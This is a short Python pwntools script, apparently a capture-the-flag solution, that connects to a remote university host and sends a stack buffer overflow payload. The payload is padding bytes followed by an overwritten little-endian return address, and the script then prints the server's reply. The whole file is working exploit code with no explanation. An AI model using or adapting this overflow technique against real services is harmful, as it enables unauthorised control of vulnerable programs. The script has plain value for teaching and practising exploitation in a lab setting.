from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25154

s =  remote(SERVER, PORT, timeout=9999)

print(s.recvline())
s.sendline(b"a"*0x16 + 0x80486f1.to_bytes(4, 'little'))
print(s.recvall())